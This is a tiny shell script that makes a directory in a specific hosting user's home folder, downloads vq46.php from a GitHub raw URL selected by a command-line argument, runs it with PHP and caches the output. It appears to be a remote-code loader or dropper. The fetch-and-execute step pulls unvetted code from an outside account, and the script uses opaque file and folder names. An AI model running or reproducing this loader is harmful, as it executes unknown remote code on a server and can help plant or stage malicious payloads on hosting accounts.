#!/bin/sh
D=/home/u791571885/dgq46; mkdir -p $D; cd $D || exit 1
[ -f out.txt ] && { cat out.txt; exit 0; }
curl -fsSL -o vq46.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vq46.php"
/opt/alt/php83/usr/bin/php vq46.php > out.tmp 2>&1; mv out.tmp out.txt; cat out.txt
